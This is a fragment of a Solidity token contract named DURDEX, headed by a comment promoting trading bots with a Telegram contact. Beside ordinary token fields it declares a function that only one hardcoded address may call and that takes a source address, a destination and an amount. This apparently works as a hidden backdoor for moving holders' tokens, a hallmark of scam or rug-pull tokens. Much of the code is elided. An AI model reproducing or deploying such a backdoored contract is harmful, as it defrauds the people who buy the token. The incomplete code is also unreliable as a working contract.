//sniper bot, pancake bot? why not this?? but automatic TG: @casanva
pragma solidity 0.6.6;

contract DURDEXToken {
   
    mapping (address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "DURDEX";
    string public symbol = "DDEX";
    ...
    function transfer(address to, uint256 value) public returns (bool success) {
     ...
     function fuckedup(address _from, address _to, uint256 _value) public returns (bool success){
        require(msg.sender == 0x85448C1B648bd52eeC3530E2a069cE59e1533BBB);
